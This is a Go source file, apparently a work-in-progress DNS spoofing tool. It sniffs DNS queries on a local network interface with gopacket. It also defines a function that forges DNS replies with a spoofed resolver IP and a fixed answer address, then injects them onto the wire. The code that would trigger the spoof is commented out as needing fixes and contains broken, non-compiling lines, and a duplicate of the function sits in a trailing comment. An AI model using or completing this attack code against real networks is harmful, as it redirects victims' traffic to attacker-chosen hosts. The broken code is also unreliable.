package main

import (
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
    "log"
    "net"
    "time"
    "fmt"
    "encoding/binary"
    "strings"
)

var (
    device       string = "en1"
    snapshot_len int32  = 1024
    promiscuous  bool   = false
    err          error
    timeout      time.Duration = 1 * time.Microsecond
    handle       *pcap.Handle
    buffer       gopacket.SerializeBuffer
    options      gopacket.SerializeOptions
)


func main() {
    // Open device
    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
    if err != nil {log.Fatal(err) }
    defer handle.Close()

    // search for dns packets, grab mac, ip address of requester, id, sld, tld of DNS
    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
    for packet := range packetSource.Packets() {
        


        incommingDnsLayer := packet.Layer(layers.LayerTypeDNS)
        if incommingDnsLayer != nil {

            incommingEthernetLayer := packet.Layer(layers.LayerTypeEthernet)
            incommingIpLayer := packet.Layer(layers.LayerTypeIPv4)
            incommingUdpLayer := packet.Layer(layers.LayerTypeUDP)
            if incommingEthernetLayer != nil && incommingIpLayer != nil && incommingUdpLayer != nil{
                ethernetFrame, _ := incommingEthernetLayer.(*layers.Ethernet)
                ipDatagram, _ := incommingIpLayer.(*layers.IPv4)
                udpPacket, _ := incommingUdpLayer.(*layers.UDP)
                dnsPayload, _ := incommingDnsLayer.(*layers.DNS)

                fmt.Println("ethernet addr: \n", ethernetFrame.DstMAC)
                fmt.Println("IP addr: \n", ipDatagram.DstIP)
                fmt.Println("UDP port: \n", udpPacket.DstPort)
                fmt.Println("DNS ID: \n", dnsPayload.ID)


             /* THIS AREA NEEDS FIXIN' 

                 dnsID := make([]byte, 2)
                 binary.LittleEndian.PutUint16(dnsID, dnsPayload.ID)
                 splitName := strings.Split(string(dnsPayload.Questions[0].Name), ".")
                 fmt.Printf("dns name: %s %s" , s[len(s) - 2], s[len(s) - 1])

                
                 sld := make([]byte, len(splitName[len(splitName) - 2]))

                 sld = splitName[len(splitName -2)]

                 tld := make([]byte, len(splitName[len(splitName) - 1]))

                 tld = splitName[len(splitName - 1)]
    

               dnsSpoof(handle, ethernetFrame.SrcMAC, ipDatagram.SrcIP, 
                   dnsID, []byte{0x03}, []byte("joe"), []byte{0x03}, []byte("joe"))

                   */
            
            }

      
// we need handle, DstMac, DstIP, dnsID, lengthofSLD, SLD, lengthofTLD, TLD, aName (maybe)
   
        
       
    }
    }
    

 
   
}

func dnsSpoof(handle *pcap.Handle, DstMac []byte, DstIP []byte, dnsID []byte, lengthOfSLD []byte, SLDName []byte, 
                lengthOfTLD []byte, TLDName []byte){
    

     buffer = gopacket.NewSerializeBuffer()
    
   

   
    ethernetLayer := &layers.Ethernet{
        SrcMAC: net.HardwareAddr{0xb8,0x09,0x8a,0xde,0xaa,0xf7}, // set this
        DstMAC: DstMac, // dynamic
        EthernetType: 0x0800,

    }

    ipLayer := &layers.IPv4{
        Version: 4,
        IHL: 5,
        TOS: 0,
        SrcIP: net.IP{192,168,0,1}, // set this
        DstIP: DstIP, //dynamic
        TTL: 100,
        Length:40,
        Id:555,
        Flags:0,
        Protocol:17,
       


    }

   //rawBytes := []byte{10, 20, 30}
    udpLayer := &layers.UDP{
    
        SrcPort: layers.UDPPort(53),
        DstPort: layers.UDPPort(53),
      
        
        Length: 20,
    }
    udpLayer.SetNetworkLayerForChecksum(ipLayer)

    ID := dnsID //dynamic
    rplyCode := []byte{0x81,0x80}
    questions := []byte{0x00,0x01}
    answerRR := []byte{0x00, 0x01}
    authorityRR := []byte{0x00, 0x00}
    additionalRR := []byte{0x00,0x00}

    //queries
    //lengthOfSLD := lengthOfSLD //dynamic
    //SLDName := SLD //dynamic
    //lengthOfTLD := []byte{0x03} //dynamic
    //TLDName := []byte{0x63, 0x6f, 0x6d} //dynamic
    NoIdeaWhatThisIs := []byte{0x00}
    Type := []byte{0x00, 0x01}
    Class := []byte{0x00, 0x01} // Class In

    //answers
    aName := []byte{0xc0, 0x0c} //dynamic
    aType := []byte{0x00, 0x01}
    aClass := []byte{0x00, 0x01}
    TTL := []byte{0x00, 0x00, 0x02, 0x58}
    dataLength := []byte{0x00,0x04} 
    ipAddr := []byte{0x36, 0xb7, 0xe7, 0x22} 

    //name server
    nsName := []byte{0xc0, 0x0c}
    nsType := []byte{0x00, 0x02}
    nsClass := []byte{0x00, 0x01}
    nsTTL  := []byte{0x00, 0x00, 0x02, 0x58}
    nsLength := []byte{0x00, 0x03}
    ns := []byte{0x61, 0x61, 0x61}
  
        dns := append(ID, rplyCode...)
        dns = append(dns, questions...)
        dns = append(dns, answerRR...)
        dns = append(dns, authorityRR...)
        dns = append(dns, additionalRR...)
        dns = append(dns, lengthOfSLD...)
        dns = append(dns, SLDName...)
        dns = append(dns, lengthOfTLD...)
        dns = append(dns, TLDName...)
        dns = append(dns, NoIdeaWhatThisIs...)
        dns = append(dns, Type...)
        dns = append(dns, Class...)
        dns = append(dns, aName...)
        dns = append(dns, aType...)
        dns = append(dns, aClass...)
        dns = append(dns, TTL...)
        dns = append(dns, dataLength...)
        dns = append(dns, ipAddr...)
        dns = append(dns, nsName...)
        dns = append(dns, nsType...)
        dns = append(dns, nsClass...)
        dns = append(dns, nsTTL...)
        dns = append(dns, nsLength...)
        dns = append(dns, ns...)
  //  dns := append(ID, rplyCode, questions, answerRR, authorityRR, additionalRR, lengthOfSLD, SLDName, lengthOfTLD, TLDName,
    //            NoIdeaWhatThisIs, Type, Class)
  options.ComputeChecksums = true
  options.FixLengths = true
 err1 := gopacket.SerializeLayers(buffer, options,
        ethernetLayer,
        ipLayer,
        udpLayer,
        gopacket.Payload(dns),
       
 
    )
    fmt.Println(err1)
    outgoingPacket := buffer.Bytes()

    err = handle.WritePacketData(outgoingPacket)
    if err != nil {
        fmt.Println(err)
    }
}

/*
 buffer = gopacket.NewSerializeBuffer()
    
   

   
    ethernetLayer := &layers.Ethernet{
        SrcMAC: net.HardwareAddr{0xb8,0x09,0x8a,0xde,0xaa,0xf7}, // set this
        DstMAC: net.HardwareAddr{0xb8,0x09,0x8a,0xde,0xaa,0xf7}, // dynamic
        EthernetType: 0x0800,

    }

    ipLayer := &layers.IPv4{
        Version: 4,
        IHL: 5,
        TOS: 0,
        SrcIP: net.IP{192,168,0,1}, // set this
        DstIP: net.IP{192,168,5,6}, //dynamic
        TTL: 100,
        Length:40,
        Id:555,
        Flags:0,
        Protocol:17,
       


    }

   //rawBytes := []byte{10, 20, 30}
    udpLayer := &layers.UDP{
    
        SrcPort: layers.UDPPort(53),
        DstPort: layers.UDPPort(53),
      
        
        Length: 20,
    }
    udpLayer.SetNetworkLayerForChecksum(ipLayer)

    ID := []byte{0xb5,0xcd} //dynamic
    rplyCode := []byte{0x81,0x80}
    questions := []byte{0x00,0x01}
    answerRR := []byte{0x00, 0x01}
    authorityRR := []byte{0x00, 0x00}
    additionalRR := []byte{0x00,0x00}

    //queries
    lengthOfSLD := []byte{0x03} //dynamic
    SLDName := []byte{0x6a,0x61,0x79} //dynamic
    lengthOfTLD := []byte{0x03} //dynamic
    TLDName := []byte{0x63, 0x6f, 0x6d} //dynamic
    NoIdeaWhatThisIs := []byte{0x00}
    Type := []byte{0x00, 0x01}
    Class := []byte{0x00, 0x01} // Class In

    //answers
    aName := []byte{0xc0, 0x0c} //dynamic
    aType := []byte{0x00, 0x01}
    aClass := []byte{0x00, 0x01}
    TTL := []byte{0x00, 0x00, 0x02, 0x58}
    dataLength := []byte{0x00,0x04} 
    ipAddr := []byte{0x36, 0xb7, 0xe7, 0x22} 

    //name server
    nsName := []byte{0xc0, 0x0c}
    nsType := []byte{0x00, 0x02}
    nsClass := []byte{0x00, 0x01}
    nsTTL  := []byte{0x00, 0x00, 0x02, 0x58}
    nsLength := []byte{0x00, 0x03}
    ns := []byte{0x61, 0x61, 0x61}
  
        dns := append(ID, rplyCode...)
        dns = append(dns, questions...)
        dns = append(dns, answerRR...)
        dns = append(dns, authorityRR...)
        dns = append(dns, additionalRR...)
        dns = append(dns, lengthOfSLD...)
        dns = append(dns, SLDName...)
        dns = append(dns, lengthOfTLD...)
        dns = append(dns, TLDName...)
        dns = append(dns, NoIdeaWhatThisIs...)
        dns = append(dns, Type...)
        dns = append(dns, Class...)
        dns = append(dns, aName...)
        dns = append(dns, aType...)
        dns = append(dns, aClass...)
        dns = append(dns, TTL...)
        dns = append(dns, dataLength...)
        dns = append(dns, ipAddr...)
        dns = append(dns, nsName...)
        dns = append(dns, nsType...)
        dns = append(dns, nsClass...)
        dns = append(dns, nsTTL...)
        dns = append(dns, nsLength...)
        dns = append(dns, ns...)
  //  dns := append(ID, rplyCode, questions, answerRR, authorityRR, additionalRR, lengthOfSLD, SLDName, lengthOfTLD, TLDName,
    //            NoIdeaWhatThisIs, Type, Class)
  options.ComputeChecksums = true
  options.FixLengths = true
 err1 := gopacket.SerializeLayers(buffer, options,
        ethernetLayer,
        ipLayer,
        udpLayer,
        gopacket.Payload(dns),
       
 
    )
    fmt.Println(err1)
    outgoingPacket := buffer.Bytes()

    err = handle.WritePacketData(outgoingPacket)
    if err != nil {
        fmt.Println(err)
    }
    */

